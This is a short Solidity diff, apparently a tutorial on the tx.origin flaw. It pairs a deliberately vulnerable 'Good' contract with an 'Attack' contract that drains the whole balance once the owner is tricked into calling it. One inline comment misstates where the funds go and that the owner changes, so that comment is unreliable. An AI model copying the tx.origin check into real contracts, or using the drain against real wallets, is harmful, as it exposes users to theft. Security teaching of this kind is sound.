@@ -1,0 +1,37 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+
+/*
+Good is a simple contract where only the owner should be able to transfer
+Ether to another address. Good.transfer() uses tx.origin to check that the
+caller is the owner. Let's see how we can hack this contract
+*/
+contract Good {
+    address public owner;
+    constructor() payable{
+        owner = msg.sender;
+    }
+
+function transfer(address payable _to, uint amount) public {
+    require(tx.origin == owner, "Sorry, you dont have authority");
+
+    (bool sent, ) = _to.call{value: amount}("");
+    require(sent, "tansfer failed");
+} 
+}
+
+contract Attack{
+    address payable public  owner;
+    Good good;
+    constructor(Good _good) {
+        good = Good(_good);
+        owner = payable(msg.sender) ;   
+    }
+    //owner is changed to Attack and fund is transferred to Attack Contract
+    function attacker() public {
+        good.transfer(owner, address(good).balance);
+    }
+}
+
+
